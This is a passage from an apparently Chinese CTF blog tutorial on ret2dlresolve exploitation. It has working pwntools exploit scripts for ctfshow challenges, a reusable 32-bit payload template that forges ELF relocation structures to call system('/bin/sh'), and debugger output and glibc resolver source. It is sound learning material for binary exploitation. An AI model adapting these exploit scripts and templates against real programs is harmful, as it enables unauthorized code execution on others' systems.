0x100)</span><br><span class="line">sh.sendlineafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line">sh.send(p32(bss_addr))</span><br><span class="line">sh.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下No-Relro"><a href="#64位下No-Relro" class="headerlink" title="64位下No-Relro"></a>64位下No-Relro</h3><p>以ctfshow Pwn84为例，由于是64位所以需要寄存器传参，但是由于没有合适的gadget，这里采用ret2csu</p><p>而且只能溢出0x30个字节，显然不够用，所以还要先进行一次Stack Pivot</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250306103950624.png" alt="image-20250306103950624"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">sh = process(&#x27;./pwn2&#x27;)</span><br><span class="line">#gdb.attach(sh, &#x27;b *0x40063B\nc&#x27;)</span><br><span class="line">#sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28161)</span><br><span class="line">DT_STRTAB_addr = 0x600990</span><br><span class="line">read_plt_next = 0x400516</span><br><span class="line">pop_rdi = 0x400773</span><br><span class="line">payload = cyclic(0x70 + 0x8)</span><br><span class="line">csu_front_addr = 0x400750</span><br><span class="line">csu_end_addr = 0x40076A</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">fake_dynstr = dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)</span><br><span class="line">pivot_addr = elf.bss(0x100) - 0x8</span><br><span class="line">pop_rbp_ret = 0x400588</span><br><span class="line">leave_ret = 0x40063c</span><br><span class="line">ret_addr = 0x4004c6</span><br><span class="line">def ret2csu(fuction, rdi, rsi, rdx):</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(1)</span><br><span class="line">    payload += p64(fuction)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    return payload</span><br><span class="line">def ret2csu_end():</span><br><span class="line">    return cyclic(0x38)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x70 + 0x8)</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x100),0x150)</span><br><span class="line">payload += ret2csu_end()</span><br><span class="line">payload += p64(ret_addr) + p64(0x40063E)</span><br><span class="line">sh.sendafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">payload = ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x300),len(fake_dynstr))</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,DT_STRTAB_addr,0x8)</span><br><span class="line">payload += ret2csu(elf.got[&#x27;read&#x27;],0,elf.bss(0x250),len(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">payload += ret2csu_end()</span><br><span class="line">payload += p64(ret_addr) + p64(pop_rdi) + p64(elf.bss(0x250)) + p64(read_plt_next) + p64(0xdeadbeef)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x70) + p64(pivot_addr) + p64(leave_ret)</span><br><span class="line">sh.sendafter(&#x27;Welcome to CTFshowPWN!\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sh.send(fake_dynstr)</span><br><span class="line">sh.send(p64(elf.bss(0x300)))</span><br><span class="line">sh.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="32位下的partial-relro-no-leak"><a href="#32位下的partial-relro-no-leak" class="headerlink" title="32位下的partial-relro.no-leak"></a>32位下的partial-relro.no-leak</h3><p>因为是partial-relro所以并不能像之前那样直接改Elfxx_Dyn结构体了，但我们仍可以通过修改入口函数的reloc_index，再伪造Elf_Rel </p><p>ELF_sym、dynstr这三个结构体来达到解析任意函数的目的</p><p>之前已经说过，每个函数对应的结构体都是通过偏移来寻找的，那么我们还需要知道偏移是怎么计算的</p><h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>具体的，我们需要计算的偏移有：</p><ol><li><p>传递给<code>_dl_runtime_resolve</code>函数的<code>offset</code>参数：32位下为<code>Elf32_Rel</code>条目到<code>.ret.plt</code>节的偏移，64位下为<code>Elf64_Rela</code>条目的索引值；</p></li><li><p><code>Elf_Rel</code>结构体中的<code>r_info</code>：<code>r_info</code>是一个复合数值，其低8位为重定位类型（Relocation Types），一般在利用上选取<code>R_386_JMP_SLOT=R_X86_64_JUMP_SLOT=7</code>即函数类型进行填充。而剩下高位部分则为对应<code>Elf_Sym</code>条目在<code>.dynsym</code>中的下标，即<code>index = (r_info &gt;&gt; 8)</code></p></li><li><p><code>Elf_Sym</code>结构体中的<code>st_name</code>：该值为函数字符串相对于<code>.dynstr</code>表基址的偏移。</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250813190723225.png" alt="image-20250813190723225"></p></li></ol><h5 id="特殊成员r-info"><a href="#特殊成员r-info" class="headerlink" title="特殊成员r_info"></a>特殊成员r_info</h5><p>由于r_info我们是自己根据Elfxx_Dyn计算出的偏移，当在程序访问 version 的 hash 时(会用到r_info)会导致访问到不存在地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        const ElfW(Half) *vernum =</span><br><span class="line">            (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">        ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">        version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">        if (version-&gt;hash == 0)</span><br><span class="line">            version = NULL;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过分析 .dynmic 节，我们可以发现 vernum 的地址为 0x80482d8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">❯ readelf -d main_partial_relro_32</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf0c contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x804834c</span><br><span class="line"> 0x0000000d (FINI)                       0x8048654</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f04</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x804826c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481cc</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048324</span><br><span class="line"> 0x00000011 (REL)                        0x804830c</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482ec</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482d8</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><p>在 ida 中，我们也可以看到相关的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080482D8 ; ELF GNU Symbol Version Table</span><br><span class="line">LOAD:080482D8                 dw 0</span><br><span class="line">LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0</span><br><span class="line">LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0</span><br><span class="line">LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__</span><br><span class="line">LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0</span><br><span class="line">LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0</span><br><span class="line">LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0</span><br><span class="line">LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0</span><br><span class="line">LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0</span><br><span class="line">LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used</span><br></pre></td></tr></table></figure><p>那我们可以再次运行看一下伪造后 ndx 具体的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ python stage4.py</span><br><span class="line">[*] &#x27;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting local process &#x27;./main_partial_relro_32&#x27;: pid 27649</span><br><span class="line">[*] Loaded 10 cached gadgets for &#x27;./main_partial_relro_32&#x27;</span><br><span class="line">ndx_addr: 0x80487a8</span><br></pre></td></tr></table></figure><p>可以发现，ndx_落入了 <code>.eh_frame</code> 节中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8                 dw 442Ch</span><br></pre></td></tr></table></figure><p>进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">    const ElfW(Half) *vernum =</span><br><span class="line">        (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    if (version-&gt;hash == 0)</span><br><span class="line">        version = NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *((struct link_map *)0xf7f0d940)</span><br><span class="line">$4 = &#123;</span><br><span class="line">  l_addr = 0, </span><br><span class="line">  l_name = 0xf7f0dc2c &quot;&quot;, </span><br><span class="line">  l_ld = 0x8049f0c, </span><br><span class="line">  l_next = 0xf7f0dc30, </span><br><span class="line">  l_prev = 0x0, </span><br><span class="line">  l_real = 0xf7f0d940, </span><br><span class="line">  l_ns = 0, </span><br><span class="line">  l_libname = 0xf7f0dc20, </span><br><span class="line">  l_info = &#123;0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 &lt;repeats 13 times&gt;, 0x8049fbc, 0x0 &lt;repeats 25 times&gt;, 0x8049f44&#125;, </span><br><span class="line">  l_phdr = 0x8048034, </span><br><span class="line">  l_entry = 134513632, </span><br><span class="line">  l_phnum = 9, </span><br><span class="line">  l_ldnum = 0, </span><br><span class="line">  l_searchlist = &#123;</span><br><span class="line">    r_list = 0xf7edf3e0, </span><br><span class="line">    r_nlist = 3</span><br><span class="line">  &#125;, </span><br><span class="line">  l_symbolic_searchlist = &#123;</span><br><span class="line">    r_list = 0xf7f0dc1c, </span><br><span class="line">    r_nlist = 0</span><br><span class="line">  &#125;, </span><br><span class="line">  l_loader = 0x0, </span><br><span class="line">  l_versions = 0xf7edf3f0, </span><br><span class="line">  l_nversions = 3, </span><br></pre></td></tr></table></figure><p>对应的分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *((struct r_found_version[3] *)0xf7edf3f0)</span><br><span class="line">$13 = &#123;&#123;</span><br><span class="line">    name = 0x0, </span><br><span class="line">    hash = 0, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x0</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    name = 0x0, </span><br><span class="line">    hash = 0, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x0</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    name = 0x80482be &quot;GLIBC_2.0&quot;, </span><br><span class="line">    hash = 225011984, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x804826d &quot;libc.so.6&quot;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print /x 0xf7edf3f0+0x442C*16</span><br><span class="line">$16 = 0xf7f236b0</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line">0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ec1000 0xf7ec4000 rw-p     3000 0      </span><br><span class="line">0xf7edf000 0xf7ee1000 rw-p     2000 0      </span><br><span class="line">0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]</span><br></pre></td></tr></table></figure><p>而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p><p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为 0。</p><p>那自然的，我们就可以调用目标函数。</p><p>我们可以通过调整 base_stage 来达到相应的目的。</p><p>还有一个坑点是因为r_info必须得是0x10的倍数，因为计算方式先整数0x10再乘0x10，如果不是0x10的倍数会导致最后的4bit丢失，从而导致寻找不到对应的结构体</p><p>下面放出我自己写的32位的板子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def ret2dlresolve_x86(elf,bss_addr,got,function_name,value1,value2,value3):</span><br><span class="line">    jmp_plt0_addr = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr</span><br><span class="line">    rel_plt_addr = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr</span><br><span class="line">    dynsym_addr = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr</span><br><span class="line">    dynstr_addr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr</span><br><span class="line"></span><br><span class="line">    reloc_index = (bss_addr + 0x60) - rel_plt_addr</span><br><span class="line">    r_info = (((bss_addr + 0x84 - dynsym_addr) // 0x10) &lt;&lt; 8) + (0x7 &amp; 0xFF) #必须要调整r_info的值为0x10的倍数,如果不是0x10倍数，一次整除0x10再一次乘0x10会导致最终的后4bit丢失</span><br><span class="line">    st_name = (bss_addr + 0xA4) - dynstr_addr</span><br><span class="line"></span><br><span class="line">    ropp3r = p32(jmp_plt0_addr) + p32(reloc_index) + p32(0xdeadbeef) + p32(value1) + p32(value2) + p32(value3)</span><br><span class="line">    ropp3r = ropp3r.ljust(0x40,b&#x27;A&#x27;)</span><br><span class="line">    fake_data = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">    fake_data = fake_data.ljust(0x20,b&#x27;A&#x27;)</span><br><span class="line">    fake_rel_plt = p32(got) + p32(r_info)</span><br><span class="line">    fake_rel_plt = fake_rel_plt.ljust(0x24,b&#x27;A&#x27;)</span><br><span class="line">    fake_dynsym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">    fake_dynsym = fake_dynsym.ljust(0x20,b&#x27;A&#x27;)</span><br><span class="line">    fake_dynstr = function_name</span><br><span class="line"></span><br><span class="line">    payload = ropp3r + fake_data + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line">    ndx_addr = (r_info &gt;&gt; 8)*2 + 0x80482d8</span><br><span class="line">    print(&#x27;[+]r_info:&#x27;, hex((r_info)))</span><br><span class="line">    print(&#x27;[+]r_info &gt;&gt;8 :&#x27;, hex((r_info &gt;&gt; 8)))</span><br><span class="line">    print(&#x27;[+](bss_addr + 0x84 - dynsym_addr):&#x27;,hex((bss_addr + 0x84 - dynsym_addr)))</span><br><span class="line">    print(&#x27;[+]ndx_addr:&#x27;, hex((ndx_addr)))</span><br><span class="line">    print(&#x27;[+]dynsym_addr:&#x27;, hex((dynsym_addr)))</span><br><span class="line">    print(&#x27;[+]bss_addr:&#x27;, hex((bss_addr)))</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><h3 id="64位下的partial-relro-no-leak"><a href="#64位下的partial-relro-no-leak" class="headerlink" title="64位下的partial-relro.no-leak"></a>64位下的partial-relro.no-leak</h3><p>我们假设一种64位下比较极端的情况——没有任何输出函数可以泄露出<code>link_map</code>的地址，则我们就无法修改<code>l_info[VERSYMIDX(DT_VERSYM)]</code>为<code>NULL</code>，那么我们就无法绕开的<code>l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != NULL</code>，即程序因访问到非法区域而崩溃。（32位则不需要考虑是否会崩溃，可直接使用2,1节的方式进行攻击）</p><p>此时我们需要<strong>一种不需要输出函数也能攻击的方法</strong></p><p><strong>我们如果之前的32位是绕过小判断，则这次我们需要绕过更上一层的判断</strong>，即使得 <code>if (__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0) == 0)</code>不成立，走进else分支。</p><p>我们来看看<code>_dl_fixup()</code>中这段源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  source/elf/dl-runtime.c</span></span><br><span class="line"><span class="comment">/* Construct a value of type DL_FIXUP_VALUE_TYPE from a code address</span></span><br><span class="line"><span class="comment">   and a link map.  */</span>                                              </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (addr)  </span></span><br><span class="line">_dl_fixup()&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not                       </span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span>                                              </span><br><span class="line">    <span class="comment">// 判断符号的可见性                                                                    </span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) <span class="comment">// 避免进入该分支！                      </span></span><br><span class="line">    &#123;                                                                                       </span><br><span class="line">        <span class="comment">// 获取符号的版本信息                                                              </span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;                                       </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)                                        </span><br><span class="line">        &#123;                                                                                   </span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;                   </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];                                                  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)                                                         </span><br><span class="line">                version = <span class="literal">NULL</span>;                                                             </span><br><span class="line">        &#125;                                                                                   </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is                    </span></span><br><span class="line"><span class="comment">         not necessary for objects which cannot be unloaded or when                         </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>                                            </span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;                                               </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)                                                          </span><br><span class="line">        &#123;                                                                                   </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG();                                                       </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;                                                 </span><br><span class="line">        &#125;                                                                                   </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL                                                             </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;                                                           </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>                                                                                      </span></span><br><span class="line">        <span class="comment">// 查询待解析符号所在的目标文件的 link_map                                         </span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, 